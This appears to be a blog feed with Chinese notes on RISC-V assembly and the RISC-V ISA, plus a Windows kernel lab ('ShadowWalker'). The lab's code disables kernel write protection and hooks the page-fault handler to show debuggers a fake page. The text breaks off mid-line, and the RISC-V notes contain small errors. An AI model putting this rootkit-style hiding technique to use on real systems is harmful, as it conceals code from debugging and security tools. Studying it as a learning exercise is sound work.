        <content type="html"><![CDATA[<h1 id="RISC-V-ASM"><a href="#RISC-V-ASM" class="headerlink" title="RISC-V ASM"></a>RISC-V ASM</h1><p>主要是RV32I的asm</p><h2 id="operation"><a href="#operation" class="headerlink" title="operation"></a>operation</h2><p>instruction(指令):直接对应二进制机器指令的字符串</p><p>pseudo-instruction(伪指令):一条伪指令指示汇编器产生多条实际的指令(instruction)</p><p>direction(指示&#x2F;伪操作):通过类似指令的形式(以“.”开头)，通知汇编器如何控制代码的产生等，不对应具体的指令，比如.text是告诉汇编器放到.text节里,</p><p>macro：采用 .macro&#x2F;.endm 自定义的宏</p><h2 id="指令编码格式"><a href="#指令编码格式" class="headerlink" title="指令编码格式"></a>指令编码格式</h2><p><img src="/2023/07/09/risc-v-asm/image-20230710232853854.png" alt="image-20230710232853854"></p><p><strong>funct3和funct7和opcode决定指令类型</strong>(加减乘除等等)</p><blockquote><p>funct3:funct代表function 3代表占了3bits</p></blockquote><ul><li>R-type:（Register），每条指令中有三个 fields，用于指定3个寄存器参数</li><li>I-type: (Immediate），每条指令除了带有两个寄存器参数外，还带有一个立即数参数（宽度为 12 bits）。</li><li>S-type: （Store），每条指令除了带有两个寄存器参数外，还带有一个立即数参数（宽度为 12 bits，但 fields 的组织方式不同于 I-type）</li><li>B-type: (Branch)，每条指令除了带有两个寄存器参数外，还带有一个立即数参数（宽度为 12 bits，但取值为 2 的倍数）。</li><li>U-type: （Upper），每条指令含有一个寄存器参数再加上一个立即数参数（宽度为 20bits，用于表示一个立即数的高 20 位）</li><li>J-type: （Jump），每条指令含有一个寄存器参数再加上一个立即数参数（宽度为 20bits）</li></ul><blockquote><p>rd:r代表register d代表destination</p><p>rs:s代表source</p></blockquote><h2 id="算法运算指令"><a href="#算法运算指令" class="headerlink" title="算法运算指令"></a>算法运算指令</h2><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>ADD RD(5)，RS1(5)，RS2(5)    RD&#x3D;RS1+RS2</p><blockquote><p>5表示占5个bit</p></blockquote><p>编码格式:R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721154322672.png" alt="image-20230721154322672"></p><ul><li>opcode:01 100 11</li><li>fuct3:000 funct7 0000000</li></ul><h3 id="SUB"><a href="#SUB" class="headerlink" title="SUB"></a>SUB</h3><p>SUB RD, RS1, RS2RD&#x3D;RS1-RS2</p><p>编码格式:R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721154425111.png" alt="image-20230721154425111"></p><ul><li>opcode:01 100 11</li><li>fuct3:000 funct7 0100000</li></ul><h3 id="ADDI（ADD-Immediate）"><a href="#ADDI（ADD-Immediate）" class="headerlink" title="ADDI（ADD Immediate）"></a>ADDI（ADD Immediate）</h3><p>ADDI RD, RS1, IMMRD&#x3D;RSI+IMM</p><p>编码格式：I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721155114720.png" alt="image-20230721155114720"></p><p>立即数只能表是-2<sup>11</sup><del>2<sup>11</sup>-1 (-2048</del>2047)立即数参与运算前会被做符号拓展位32位imm</p><h3 id="LUI-Loda-Upper-Immediate"><a href="#LUI-Loda-Upper-Immediate" class="headerlink" title="LUI(Loda Upper Immediate)"></a>LUI(Loda Upper Immediate)</h3><p>LUI RD,IMMRD&#x3D;IMM&lt;&lt;12</p><p>编码格式：U-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721163824345.png" alt="image-20230721163824345"></p><p>和ADDI指令配合使用来给寄存器赋值大立即数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lui x1,0x12345</span><br><span class="line">addi x1,0x678 ;    x1=0x12345678</span><br></pre></td></tr></table></figure><p>对于低12位的符号位是1的情况，由于addi有符号拓展，就需要用减法来实现</p><p>比如想让x1&#x3D;0x12345fff</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lui x1,0x12346</span><br><span class="line">addi x1,-1</span><br></pre></td></tr></table></figure><h3 id="LI-Load-Immediate"><a href="#LI-Load-Immediate" class="headerlink" title="LI(Load Immediate)"></a>LI(Load Immediate)</h3><p>LI RD,IMMRD&#x3D;IMM</p><p><strong>伪指令 可以给某个寄存器赋32位的值，就不需要我们自己用lui和addi指令来做，而是由汇编器来完成</strong></p><h3 id="AUIPC"><a href="#AUIPC" class="headerlink" title="AUIPC"></a>AUIPC</h3><p>AUIPC RD IMMRD&#x3D;IMM&lt;&lt;12+PC</p><p>编码格式：U-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721171932394.png" alt="image-20230721171932394"></p><h3 id="LA-Load-Address"><a href="#LA-Load-Address" class="headerlink" title="LA(Load Address)"></a>LA(Load Address)</h3><p>LA RD,LABEL 加载一个函数或变量的地址</p><p><strong>伪指令 汇编器会利用auipc指令和其他指令来生成</strong></p><h3 id="NEG"><a href="#NEG" class="headerlink" title="NEG"></a>NEG</h3><p>NEG RD，RSRD&#x3D;-RS</p><p><strong>伪指令 实际是SUB RD，x0，RS</strong>(零寄存器x0)</p><h3 id="MV"><a href="#MV" class="headerlink" title="MV"></a>MV</h3><p>MV RD，RSRD&#x3D;RS</p><p><strong>伪指令 实际上是ADDI RD，RS，0</strong></p><h3 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a>NOP</h3><p>就是nop啦hh</p><p><strong>伪指令 实际上是ADDI x0,x0,0</strong> </p><h2 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h2><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>AND RD,RS1,RS2RD &#x3D; RS1 &amp; RS2</p><p>编码格式：R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721173921186.png" alt="image-20230721173921186"></p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>OR RD,RS1,RS2RD &#x3D; RS1 | RS2</p><p>编码格式：R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174008445.png" alt="image-20230721174008445"></p><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>AND RD,RS1,RS2RD &#x3D; RS1 ^ RS2</p><p>编码格式：R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174111167.png" alt="image-20230721174111167"></p><h3 id="ANDI"><a href="#ANDI" class="headerlink" title="ANDI"></a>ANDI</h3><p>AND RD,RS1,IMMRD &#x3D; RS1 &amp; IMM</p><p>编码格式：I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174041635.png" alt="image-20230721174041635"></p><h3 id="ORI"><a href="#ORI" class="headerlink" title="ORI"></a>ORI</h3><p>AND RD,RS1,IMMRD &#x3D; RS1 &amp; IMM</p><p>编码格式：I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174138698.png" alt="image-20230721174138698"></p><h3 id="XORI"><a href="#XORI" class="headerlink" title="XORI"></a>XORI</h3><p>AND RD,RS1,IMMRD &#x3D; RS1 &amp; IMM</p><p>编码格式：I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174152255.png" alt="image-20230721174152255"></p><h3 id="NOT"><a href="#NOT" class="headerlink" title="NOT"></a>NOT</h3><p>NOT RD,RS RD&#x3D;!RS 非</p><p><strong>伪指令 实际上是XOR RD，RS，-1</strong></p><h2 id="移位运算指令"><a href="#移位运算指令" class="headerlink" title="移位运算指令"></a>移位运算指令</h2><h3 id="gt-gt-gt-逻辑移位"><a href="#gt-gt-gt-逻辑移位" class="headerlink" title="&gt;&gt;&gt;逻辑移位"></a><strong>&gt;&gt;&gt;逻辑移位</strong></h3><h3 id="SLL-Shitf-Left-Logical"><a href="#SLL-Shitf-Left-Logical" class="headerlink" title="SLL(Shitf Left Logical)"></a>SLL(Shitf Left Logical)</h3><p>SLL RD,RS1,RS2RD&#x3D;RS1&lt;&lt;RS2</p><p>编码格式：R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180716677.png" alt="image-20230721180716677"></p><h3 id="SRL-Shitf-Right-Logical"><a href="#SRL-Shitf-Right-Logical" class="headerlink" title="SRL(Shitf Right Logical)"></a>SRL(Shitf Right Logical)</h3><p>SRL RD,RS1,RS2RD&#x3D;RS1&gt;&gt;RS2</p><p>编码格式：R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180838972.png" alt="image-20230721180838972"></p><h3 id="SLLI-Shitf-Right-Logical-Immediate"><a href="#SLLI-Shitf-Right-Logical-Immediate" class="headerlink" title="SLLI(Shitf Right Logical Immediate)"></a>SLLI(Shitf Right Logical Immediate)</h3><p>SLLI RD,RS1,IMMRD&#x3D;RS1&lt;&lt;IMM</p><p>编码格式：I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180802935.png" alt="image-20230721180802935"></p><h3 id="SRLI-Shitf-Right-Logical-Immediate"><a href="#SRLI-Shitf-Right-Logical-Immediate" class="headerlink" title="SRLI(Shitf Right Logical Immediate)"></a>SRLI(Shitf Right Logical Immediate)</h3><p>SRLI RD,RS1,IMMRD&#x3D;RS1&gt;&gt;IMM</p><p>编码格式：I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180904728.png" alt="image-20230721180904728"></p><h3 id="gt-gt-gt-算数移位"><a href="#gt-gt-gt-算数移位" class="headerlink" title="&gt;&gt;&gt;算数移位"></a><strong>&gt;&gt;&gt;算数移位</strong></h3><h3 id="SRA-Shitf-Right-Arithmetic"><a href="#SRA-Shitf-Right-Arithmetic" class="headerlink" title="SRA(Shitf Right Arithmetic)"></a>SRA(Shitf Right Arithmetic)</h3><p>SRA RD,RS1,RS2RD&#x3D;RS1&gt;&gt;RS2</p><p>编码格式：R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721181748545.png" alt="image-20230721181748545"></p><h3 id="SRAI"><a href="#SRAI" class="headerlink" title="SRAI"></a>SRAI</h3><p>SRA RD,RS1,IMMRD&#x3D;RS1&gt;&gt;IMM</p><p>编码格式：I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721181807571.png" alt="image-20230721181807571"></p><blockquote><p><strong>shamt(shift amount)意为移动量，五个bit来描述2^5 – 1&#x3D;31对于RV32就够了</strong></p></blockquote><h2 id="内存读写指令load-store"><a href="#内存读写指令load-store" class="headerlink" title="内存读写指令load store"></a>内存读写指令load store</h2><h3 id="LB-Load-Byte"><a href="#LB-Load-Byte" class="headerlink" title="LB(Load Byte)"></a>LB(Load Byte)</h3><p>LB RD,IMM(RS1)*(Byte*)(RD) &#x3D; *(Byte*)(RS1+IMM) 读取的数据做符号拓展</p><h3 id="LH-Load-Halfword"><a href="#LH-Load-Halfword" class="headerlink" title="LH(Load Halfword)"></a>LH(Load Halfword)</h3><p>LH RD,IMM(RS1)*(Halfword*)(RD) &#x3D; *(Halfword*)(RS1+IMM) 读取的两字节数据做符号拓展</p><h3 id="LW-Load-Word"><a href="#LW-Load-Word" class="headerlink" title="LW(Load Word)"></a>LW(Load Word)</h3><p>LW RD,IMM(RS1)*(Word*)(RD) &#x3D; *(Wword*)(RS1+IMM) 四字节</p><h3 id="LBU-Load-Byte-Unsigned"><a href="#LBU-Load-Byte-Unsigned" class="headerlink" title="LBU(Load Byte Unsigned)"></a>LBU(Load Byte Unsigned)</h3><p>LBU RD,IMM(RS1)*(Byte*)(RD) &#x3D; *(Byte*)(RS1+IMM) 读取的数据做零拓展</p><h3 id="LHU-Load-HalfWord-Unsigned"><a href="#LHU-Load-HalfWord-Unsigned" class="headerlink" title="LHU(Load HalfWord Unsigned)"></a>LHU(Load HalfWord Unsigned)</h3><p>LHU RD,IMM(RS1)*(Halfword*)(RD) &#x3D; *(Halfword*)(RS1+IMM) 读取的数据做零拓展</p><p>编码格式均为I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721182935536.png" alt="image-20230721182935536"></p><h3 id="SB-Store-Byte"><a href="#SB-Store-Byte" class="headerlink" title="SB(Store Byte)"></a>SB(Store Byte)</h3><p>SB RS2,IMM(RS1)*(Byte*)(RS1+IMM)&#x3D;RS2[0:7]</p><h3 id="SH-Stroe-Halfword"><a href="#SH-Stroe-Halfword" class="headerlink" title="SH(Stroe Halfword)"></a>SH(Stroe Halfword)</h3><p>SB RS2,IMM(RS1)*(Halfword*)(RS1+IMM)&#x3D;RS2[0:15]</p><h3 id="SW-Store-Word"><a href="#SW-Store-Word" class="headerlink" title="SW(Store Word)"></a>SW(Store Word)</h3><p>SB RS2,IMM(RS1)*(Word*)(RS1+IMM)&#x3D;RS2</p><p>编码格式均为S-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721185513346.png" alt="image-20230721185513346"></p><h2 id="条件分支指令"><a href="#条件分支指令" class="headerlink" title="条件分支指令"></a>条件分支指令</h2><p><img src="/2023/07/09/risc-v-asm/image-20230721190529161.png" alt="image-20230721190529161"></p><p><strong>跳转的目标地址计算方法：先将 IMM x 2，符号扩展后和 PC 值相加得到最终的目标地址，所以跳转范围是以 PC 为基准，+&#x2F;- 4KB 左右 ([-4096, 4094])。</strong></p><blockquote><p><img src="/2023/07/09/risc-v-asm/image-20230721192040448.png" alt="image-20230721192040448"></p><p>b-type里是没有0位的应为0位永远为0，-4096, 4094是因为 2*(-2^(11),2^(11)-1)</p></blockquote><p><img src="/2023/07/09/risc-v-asm/image-20230721194722440.png" alt="image-20230721194722440"></p><h3 id="JAL-Jump-And-Link"><a href="#JAL-Jump-And-Link" class="headerlink" title="JAL(Jump And Link)"></a>JAL(Jump And Link)</h3><p>JAL RD,LABEL</p><p>编码格式J-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721213626062.png" alt="image-20230721213626062"></p><p>调用子过程，把20位宽的立即数<em>2后进行符号拓展和pc值相加，然后把下一条指令地址写入RD，所以跳转范围应该是2*(-2^(19),2^(19)-1)即(-1048576，1048574)约等于</em><em>+&#x2F;-1M</em>*</p><h3 id="JALR-Jump-And-Link-Register"><a href="#JALR-Jump-And-Link-Register" class="headerlink" title="JALR(Jump And Link Register)"></a>JALR(Jump And Link Register)</h3><p>JALR RD,IMM(RS1)</p><p>编码格式I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721214742447.png" alt="image-20230721214742447"></p><p>调用子过程，把12bit的IMM进行符号拓展后和RS1相加，将结果最低1bit设置为0(确保地址按照两字节对齐)，跳转地址以RS1为基准，-2^11,2^11-1，上下**+&#x2F;-2k**</p><blockquote><p>对于超过1M的远距离跳转</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auipc x6,IMM </span><br><span class="line">jalr x1,x6,IMM</span><br></pre></td></tr></table></figure></blockquote><h3 id="J"><a href="#J" class="headerlink" title="J"></a>J</h3><p>J offset 相当于x86的jmp</p><p><strong>伪指令 相当于JAL x0，offset</strong></p><h3 id="JR"><a href="#JR" class="headerlink" title="JR"></a>JR</h3><p>JR RS</p><p><strong>伪指令 相当于JALR x0，0(RS)</strong></p><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p><img src="/2023/07/09/risc-v-asm/image-20230721235450399.png" alt="image-20230721235450399"></p><h3 id="基于调用约定的伪指令"><a href="#基于调用约定的伪指令" class="headerlink" title="基于调用约定的伪指令"></a>基于调用约定的伪指令</h3><p><img src="/2023/07/09/risc-v-asm/image-20230722001809195.png" alt="image-20230722001809195"></p><p>TODO: emm，编译32位riscv时缺少头文件了，暂时没解决，64位又有一点点不一样，暂时不做实例分析</p>]]></content>
      
      
      
        <tags>
            
            <tag> RISC-V </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RISC-V ISA介绍</title>
      <link href="/2023/07/08/ISA-risc-v/"/>
      <url>/2023/07/08/ISA-risc-v/</url>
      
        <content type="html"><![CDATA[<h1 id="RISC-V-ISA"><a href="#RISC-V-ISA" class="headerlink" title="RISC-V ISA"></a>RISC-V ISA</h1><p>开源</p><h2 id="ISA-Instruction-Set-Architecture-指令集架构"><a href="#ISA-Instruction-Set-Architecture-指令集架构" class="headerlink" title="ISA(Instruction Set Architecture)指令集架构"></a>ISA(Instruction Set Architecture)指令集架构</h2><p>底层硬件电路面向上层软件程序提供的一层<strong>接口规范</strong></p><blockquote><p>操作系统提供给应用程序的接口就是系统调用，操作系统和硬件直接就是ISA 硬件部分的话业界里一般叫<a href="https://zh.wikipedia.org/zh-cn/%E5%BE%AE%E6%9E%B6%E6%A7%8B">微架构</a>microarchitecture，有了ISA的抽象层我们做底层开发就不需要关心微架构具体是什么样的</p></blockquote><p>他是一套标准，类似c语言的标准，POSIX标准等等，具体的实现有很多种，不同的cpu厂家实现是不一样的，就比如说x86架构的标准可能由intel和amd等公司来实现</p><blockquote><p>小故事：amd64架构</p><p>当年intel先推出64位架构(IA-64)处理器但是他不兼容32位架构的机器，导致芯片滞销，amd后推出64位指令集架构amd64兼容了之前32位指令集，畅销后，软件生态上就占领了先机，intel只能用amd64架构(好像是买amd64的授权，<del>涉及到授权关系就挺混乱了。。。</del>)，intel在此基础上进行了扩充,叫x86-64</p></blockquote><p>ISA定义了</p><ul><li>基本数据类型</li><li>寄存器</li><li>指令</li><li>内存模型</li><li>寻址模式</li><li>异常或中断的处理方式等等</li></ul><blockquote><p>一个比较错误的认为就是<del>ISA就是汇编</del>，汇编是ISA的一小部分</p></blockquote><h2 id="RISC-V-ISA-命名格式"><a href="#RISC-V-ISA-命名格式" class="headerlink" title="RISC-V ISA 命名格式"></a>RISC-V ISA 命名格式</h2><p><strong>RV[###][abc…..xyz]</strong></p><ul><li>RV：用于标识 RISC-V 体系架构的前缀，即 RISC-V的缩写。</li><li>[###]：{32, 64, 128} 用于标识处理器的字宽，也就是处理器的寄存器的宽度（单位为bit）</li><li>[abc…xyz]：标识该处理器支持的指令集模块集合</li></ul><h2 id="模块化ISA"><a href="#模块化ISA" class="headerlink" title="模块化ISA"></a>模块化ISA</h2><p>由1个基本整数指令集 + 多个可选的扩展指令集组成。基础指令集是固定的</p><p><del>WC，可定制化芯片</del></p><table><thead><tr><th>基本指令集</th><th>描述</th></tr></thead><tbody><tr><td>RV32I</td><td>32位整数指令集</td></tr><tr><td>RV32E</td><td>RV32I 的子集，用于小型的嵌入式场景</td></tr><tr><td>RV64I</td><td>64 位整数指令集，兼容 RV32I</td></tr><tr><td>RV128I</td><td>128 位整数指令集，兼容 RV64I和RV32I</td></tr></tbody></table><table><thead><tr><th>扩展指令集</th><th>描述</th></tr></thead><tbody><tr><td>M拓展</td><td>提供乘法和除法指令</td></tr><tr><td>A拓展</td><td>提供原子操作指令</td></tr><tr><td>F拓展</td><td>提供单精度浮点数操作指令</td></tr><tr><td>D拓展</td><td>提供双精度浮点数操作指令</td></tr><tr><td>C拓展</td><td>提供压缩指令集</td></tr><tr><td>Z拓展</td><td>提供对控制和状态寄存器(CSR)的操作指令</td></tr><tr><td>P拓展</td><td>提供向量操作指令</td></tr><tr><td>B拓展</td><td>提供位操作指令</td></tr><tr><td>等等</td><td>等等</td></tr></tbody></table><p><strong>IMAFD</strong>被称为通用(General)组合，用G表示</p><h2 id="RISC-V通用寄存器"><a href="#RISC-V通用寄存器" class="headerlink" title="RISC-V通用寄存器"></a>RISC-V通用寄存器</h2><p><img src="/2023/07/08/ISA-risc-v/image-20230626115944963.png" alt="image-20230626115944963"></p><p>RV32E 将 32 个通用寄存器缩减为 16 个</p><h2 id="Hart"><a href="#Hart" class="headerlink" title="Hart"></a>Hart</h2><p>HART &#x3D; HARdware Thread</p><p>类似于intel的超线程技术，一个核里可以跑两个线程(指令执行流)，这里的HART概念就是这样一条指令执行流</p><h2 id="特权级别"><a href="#特权级别" class="headerlink" title="特权级别"></a>特权级别</h2><p><img src="/2023/07/08/ISA-risc-v/image-20230626122607114.png" alt="image-20230626122607114"></p><p>level3 machine是最高态</p><p>比如说linux操作系统用户态riscv cpu是工作在User(00)级的,内核态cpu是在Supervisor(01)级的</p><p>Machine态类似于x86的实模式，上电之后是处于Machine态的，都是物理地址</p><h2 id="Control-and-Status-Registers-CSR"><a href="#Control-and-Status-Registers-CSR" class="headerlink" title="Control and Status Registers(CSR)"></a>Control and Status Registers(CSR)</h2><p>不同的特权级别下时分别对应各自的一套CSR</p><p>高级别的特权级下可以访问低级别的CSR，反之不行</p><h2 id="内存管理和保护"><a href="#内存管理和保护" class="headerlink" title="内存管理和保护"></a>内存管理和保护</h2><h2 id="异常和中断"><a href="#异常和中断" class="headerlink" title="异常和中断"></a>异常和中断</h2>]]></content>
      
      
      
        <tags>
            
            <tag> RISC-V </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:ShadowWalker</title>
      <link href="/2023/06/04/Windows-Kernel-Experiment-ShadowWalker/"/>
      <url>/2023/06/04/Windows-Kernel-Experiment-ShadowWalker/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-ShadowWalker"><a href="#Windows内核实验-ShadowWalker" class="headerlink" title="Windows内核实验:ShadowWalker"></a>Windows内核实验:ShadowWalker</h1><p>接着上一次inlinehook缺页异常来做进程保护，反调试等</p><p>我们hook住缺页异常后可以根据错误码的第五位判断是取指令造成的缺页，还是读写造成的异常，我们就可以对两种不同缺页做不同的异常处理，可以在指令造成缺页时，把正确页挂到tlb里来使程序可以正常执行，读写造成缺页时，挂到一个fake页上来反调试</p><p>0环感觉要做到稳定是很难的</p><p>inlinehook.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REAL_PTE (DWORD64 *)0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PTE (DWORD64 *)0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f260</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">JmpTarget</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span>* p = (<span class="type">char</span>*)<span class="number">0x8003f130</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//裸函数里尽量不用局部变量，因为没有栈帧</span></span><br><span class="line">        <span class="comment">//试了一下如果这里用size_t i=0;的话，使用了寄存器edi计数，但是还是在用全局变量保险</span></span><br><span class="line">        *p = ((<span class="type">char</span>*)JmpTarget)[i];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//关闭写保护</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        and eax, not <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        <span class="comment">//构造_KiTrap0E hook头</span></span><br><span class="line">        <span class="comment">//push 0x8003f130  68 30 F1 03 80</span></span><br><span class="line">        <span class="comment">//ret  C3</span></span><br><span class="line">        mov al,<span class="number">0x68</span></span><br><span class="line">        mov ds:[<span class="number">0x80541450</span>],al</span><br><span class="line">        mov dword ptr ds:[<span class="number">0x80541451</span>],<span class="number">0x8003f130</span></span><br><span class="line">        mov al, <span class="number">0xc3</span></span><br><span class="line">        mov ds:[<span class="number">0x80541455</span>],al</span><br><span class="line"></span><br><span class="line">        mov eax,<span class="number">0xffffffff</span></span><br><span class="line">        mov ds:[T_CR3],eax</span><br><span class="line">        <span class="comment">//开启写保护</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        or eax, <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        cmp eax, ds: [T_CR3]</span><br><span class="line">        jnz PASS</span><br><span class="line"></span><br><span class="line">        mov eax, cr2</span><br><span class="line">        shr eax, <span class="number">0xc</span></span><br><span class="line">        cmp eax, <span class="number">0x412</span></span><br><span class="line">        jnz PASS</span><br><span class="line">        <span class="comment">//取出错误码，+20是因为pushad压了栈</span></span><br><span class="line">        mov eax, ss: [esp + <span class="number">0x20</span>]</span><br><span class="line">        test eax, <span class="number">0x10</span></span><br><span class="line">        jne EXECUTE</span><br><span class="line">        jmp READWRITE</span><br><span class="line">        <span class="comment">//取指令造成异常</span></span><br><span class="line">    EXECUTE:</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x412000</span>)=*REAL_PTE;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//放入指令tlb里</span></span><br><span class="line">        mov eax, <span class="number">0x412004</span></span><br><span class="line">        call eax</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//再次销毁页，使读写时造成缺页</span></span><br><span class="line">    *PTE(<span class="number">0x412000</span>) = <span class="number">0</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        popad</span><br><span class="line">        <span class="comment">//错误码不会被iret弹出，要手动平掉这个栈</span></span><br><span class="line">        add esp, <span class="number">4</span></span><br><span class="line">        iretd</span><br><span class="line">    READWRITE :</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x412000</span>) = *FAKE_PTE;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//放入数据tlb</span></span><br><span class="line">        mov eax,ds:[<span class="number">0x41c000</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x412000</span>) = <span class="number">0</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        popad</span><br><span class="line">        <span class="comment">//错误码不会被iret弹出，要手动平掉这个栈</span></span><br><span class="line">        add esp, <span class="number">4</span></span><br><span class="line">        iretd</span><br><span class="line"> PASS:<span class="comment">//无关进程返回到原来的_KiTrap0E处理</span></span><br><span class="line">        popad</span><br><span class="line">        mov word ptr[esp + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">        push <span class="number">0x80541457</span></span><br><span class="line">        ret </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REAL_PTE (DWORD64 *)0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PTE (DWORD64 *)0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f260</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;fake_data&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;fake_data&quot;</span>)) DWORD fake_page[<span class="number">1024</span>];<span class="comment">//0x41c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    *REAL_PTE = *PTE(<span class="number">0x412000</span>);</span><br><span class="line">    *FAKE_PTE = *PTE(<span class="number">0x41c000</span>);</span><br><span class="line">    <span class="comment">//使页失效,不存在,每次都会触发缺页,从而接受我们hook的检测</span></span><br><span class="line">    *PTE(<span class="number">0x412000</span>)=<span class="number">0</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov ds:[T_CR3],eax<span class="comment">//缺页异常时会跳到被我们inlinhook的KiTrap0E,jnz end比较起来就会一样</span></span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    fake_page[<span class="number">0</span>] = <span class="number">0x12345678</span>;<span class="comment">//确保加载物理页</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 